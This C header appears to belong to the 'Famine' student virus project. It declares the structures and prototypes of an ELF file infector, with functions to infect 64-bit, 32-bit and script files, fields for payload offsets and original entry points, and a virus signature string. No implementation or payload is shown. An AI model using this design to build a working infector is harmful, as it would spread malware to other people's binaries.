#ifndef FT_FAMINE_H
# define FT_FAMINE_H
# define _GNU_SOURCE

# define PAGE 0x1000
# define ENTRY_N 6

#define JMP_MKR 0xDEADBEEF
#define FAMINE "Famine version 1.0 (c)oded by <tde-cama>-<knerini>"

# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <stdint.h>
# include <fcntl.h>
# include <unistd.h>
# include <sys/syscall.h>
# include <sys/mman.h>
# include <sys/stat.h>
# include <elf.h>
# include <stdbool.h>
# include <dirent.h>

typedef enum e_arch
{
    UNKNOWN_ARCH,
    ARCH64,
    ARCH32,
    ARCHSH
} t_arch;

typedef struct s_binary
{
    unsigned char   *buffer;
    off_t           file_size;
    t_arch          arch;
} t_binary;

typedef struct s_famine
{
    t_binary*   binary;
	uint64_t    entry;
    size_t      entry_off;
    int         ptnote_pos;
    size_t      payload_offset;
    uint64_t    payload_va;
    uint8_t*    payload;
    size_t      payload_size;
    uint64_t    text_va;
    size_t      text_off;
    size_t      text_size;
    uint8_t*    original_entry;
    uint8_t*    target_file;           // output image (allocated)
    size_t      target_size;
}   t_famine;

void    *ft_memcpy(void *dest, const void *src, size_t n);
int     ft_memcmp(const void *str1, const void *str2, size_t n);
void    *ft_memset(void *str, int c, size_t n);
int     ft_strcmp(const char *s1, const char *s2);
bool    elf64_parser(t_famine *p);
bool    elf32_parser(t_famine *p);
uint8_t *read_file(const char *path, size_t *size_out);
void    free_binary(t_binary *binary);
int     free_packer(t_famine *p, int ret);
void    usage(void);
bool    check_file_arch(t_binary *binary);
void    open_binary_in_memory(const char *binary_file, t_binary *binary);
void    *ft_calloc(size_t nb, size_t mem);
int     infects_64(t_binary *binary, char *full_path);
int     infects_32(t_binary *binary, char *full_path);
bool    build_stub(t_famine *p, const unsigned char *stub, size_t stub_len);
int     file_handler(char *path);
char    *build_path(char *path, char *filename);
bool    check_script_format(t_binary *binary);
int     infects_script(t_binary *binary, char *full_path);
#endif